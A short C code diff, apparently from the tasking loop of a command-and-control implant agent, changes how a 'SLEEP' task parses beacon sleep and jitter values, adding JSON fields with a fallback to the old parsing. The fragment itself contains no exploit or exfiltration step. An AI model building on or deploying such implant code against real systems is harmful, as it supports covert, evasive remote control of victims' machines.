@@ -2059,7 +2059,9 @@ void dispatch_task(AgentTask *task) {
     }
     else if (strcmp(type_upper, "SLEEP") == 0) {
         int sec = -1, jit = -1;
-        sscanf(args, "%d %d", &sec, &jit);
+        sec = json_get_int(args, "sec", -1);
+        jit = json_get_int(args, "jitter", -1);
+        if (sec < 0 && jit < 0) sscanf(args, "%d %d", &sec, &jit);
         if (sec >= 0) g_sleep_sec  = sec;
         if (jit >= 0) g_jitter_pct = jit;
         agent_send_result(task->id, "[+] sleep updated", "");
